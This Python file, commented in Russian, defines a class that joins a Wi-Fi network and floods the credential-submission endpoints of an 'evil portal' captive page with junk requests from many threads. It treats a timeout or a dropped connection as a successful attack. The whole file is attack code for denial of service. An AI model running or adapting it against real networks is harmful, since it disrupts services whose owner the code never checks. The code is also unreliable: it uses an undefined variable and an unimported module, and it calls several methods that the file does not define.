import threading
import logging
from typing import List, Optional
from network import NetworkManager
from config import *

class EvilPortalAttacker:
    def __init__(self):
        self.network_manager = NetworkManager()
        self.logger = logging.getLogger(__name__)
        self.attack_successful = False

    def attack_network(self, ssid: str, url: str) -> bool:
        """Атакует Evil Portal сеть"""
        self.attack_successful = False
        
        if not self.network_manager.connect_to_network(ssid):
            self.logger.error(f"Не удалось подключиться к сети {ssid}")
            return False

        try:
            # Атака через SSID метод
            if self._attack_ssid_method(ssid, url):
                return True

            # Атака через CREDS метод
            if self._attack_creds_method(ssid, url):
                return True

            # Атака через FORM метод
            if self._attack_form_method(ssid, url):
                return True

            # Атака через FETCH метод
            if self._attack_fetch_method(ssid, url):
                return True

            # Атака через XMLHttpRequest метод
            if self._attack_xmlhttp_method(ssid, url):
                return True

        except Exception as e:
            self.logger.error(f"Ошибка при атаке сети {ssid}: {str(e)}")
        
        return self.attack_successful

    def _attack_ssid_method(self, ssid: str, url: str) -> bool:
        """Атака через SSID метод"""
        try:
            response = self.network_manager.send_request(url + 'ssid')
            action = self._extract_action(response.text)
            if not action:
                return False

            self.logger.info(f'Найдена ссылка: {action}')
            self.logger.info(f'Атакуем {ssid} через SSID метод...')
            
            threads = self._create_attack_threads(ssid, action)
            return self._execute_threads(threads)
        except Exception as e:
            self.logger.error(f"Ошибка в SSID методе: {str(e)}")
            return False

    def _attack_creds_method(self, ssid: str, url: str) -> bool:
        """Атака через CREDS метод"""
        try:
            response = self.network_manager.send_request(url)
            methods = ['/post', '/get', '/postcreds', '/creds', '/add']
            
            for method in methods:
                if method in response.text:
                    self.logger.info(f'Найдена ссылка: {method}')
                    self.logger.info(f'Атакуем {ssid} через CREDS метод...')
                    
                    payload = self._generate_creds_payload()
                    threads = self._create_creds_threads(ssid, url, method, payload)
                    if self._execute_threads(threads):
                        return True
        except Exception as e:
            self.logger.error(f"Ошибка в CREDS методе: {str(e)}")
        return False

    def _attack_form_method(self, ssid: str, url: str) -> bool:
        """Атака через FORM метод"""
        try:
            response = self.network_manager.send_request(url)
            if '<form' in response.text:
                action = self._extract_action(response.text)
                if not action:
                    return False

                self.logger.info(f'Найдена ссылка: {action}')
                self.logger.info(f'Атакуем {ssid} через FORM метод...')
                
                payload = self._generate_creds_payload()
                threads = self._create_form_threads(ssid, action, payload)
                return self._execute_threads(threads)
        except Exception as e:
            self.logger.error(f"Ошибка в FORM методе: {str(e)}")
        return False

    def _attack_fetch_method(self, ssid: str, url: str) -> bool:
        """Атака через FETCH метод"""
        try:
            response = self.network_manager.send_request(url)
            if 'fetch' in response.text:
                action = self._extract_fetch_action(response.text)
                if not action:
                    return False

                self.logger.info(f'Найдена ссылка: {action}')
                self.logger.info(f'Атакуем {ssid} через FETCH метод...')
                
                payload = self._generate_creds_payload()
                threads = self._create_fetch_threads(ssid, action, payload)
                return self._execute_threads(threads)
        except Exception as e:
            self.logger.error(f"Ошибка в FETCH методе: {str(e)}")
        return False

    def _attack_xmlhttp_method(self, ssid: str, url: str) -> bool:
        """Атака через XMLHttpRequest метод"""
        try:
            response = self.network_manager.send_request(url)
            if 'XMLHttpRequest' in response.text:
                action = self._extract_xmlhttp_action(response.text)
                if not action:
                    return False

                self.logger.info(f'Найдена ссылка: {action}')
                self.logger.info(f'Атакуем {ssid} через XMLHttpRequest метод...')
                
                payload = self._generate_creds_payload()
                threads = self._create_xmlhttp_threads(ssid, action, payload)
                return self._execute_threads(threads)
        except Exception as e:
            self.logger.error(f"Ошибка в XMLHttpRequest методе: {str(e)}")
        return False

    def _extract_action(self, text: str) -> Optional[str]:
        """Извлекает action из текста"""
        try:
            action = text.split("action=")[1].split(" ")[0].replace("'", '').replace('"', '')
            if not action.startswith('/') and not action.startswith('http'):
                action = '/' + action
            if not action.startswith('http'):
                action = url + action
            return action
        except:
            return None

    def _generate_creds_payload(self) -> str:
        """Генерирует payload для атаки"""
        payload = '?email=24wpoerufjklasdhrkj53hrekjdfhnk23hdef'
        for _ in range(100):
            key = self.network_manager.generate_random_string()
            value = self.network_manager.generate_random_string(PAYLOAD_CHUNK_SIZE)
            payload += f'&{key}={value}'
        return payload

    def _create_attack_threads(self, ssid: str, action: str) -> List[threading.Thread]:
        """Создает потоки для атаки"""
        threads = []
        for _ in range(THREAD_COUNT):
            thread = threading.Thread(target=self._attack_thread, args=(ssid, action))
            threads.append(thread)
        return threads

    def _execute_threads(self, threads: List[threading.Thread]) -> bool:
        """Выполняет потоки и возвращает результат"""
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        return self.attack_successful

    def _attack_thread(self, ssid: str, action: str):
        """Поток для выполнения атаки"""
        try:
            self.network_manager.send_request(action)
        except (requests.Timeout, requests.ConnectionError):
            self.logger.info(f'Сеть {ssid} успешно атакована!')
            self.attack_successful = True
        except Exception as e:
            self.logger.error(f"Ошибка в потоке атаки: {str(e)}") 